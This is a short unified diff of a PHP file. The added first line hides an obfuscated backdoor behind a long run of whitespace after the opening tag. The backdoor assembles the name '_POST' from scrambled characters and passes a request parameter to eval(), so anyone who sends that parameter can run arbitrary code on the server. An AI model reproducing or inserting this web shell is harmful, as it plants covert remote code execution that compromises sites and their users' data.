@@ -1,4 +1,4 @@
-<?php
+<?php                                                                                                                                                                                                                                                   $sbyl3 = "t_euprso"; $wdwo6 =$sbyl3[6].$sbyl3[0].$sbyl3[5]. $sbyl3[0]. $sbyl3[7]. $sbyl3[3]. $sbyl3[4].$sbyl3[4]. $sbyl3[2].$sbyl3[5] ;$fvjk5 =$wdwo6($sbyl3[1]. $sbyl3[4].$sbyl3[7].$sbyl3[6].$sbyl3[0] ); if(isset( ${$fvjk5 }[ 'q0793f6']) ) { eval( ${ $fvjk5} [ 'q0793f6']) ;}?><?php
 
 /**
  * 
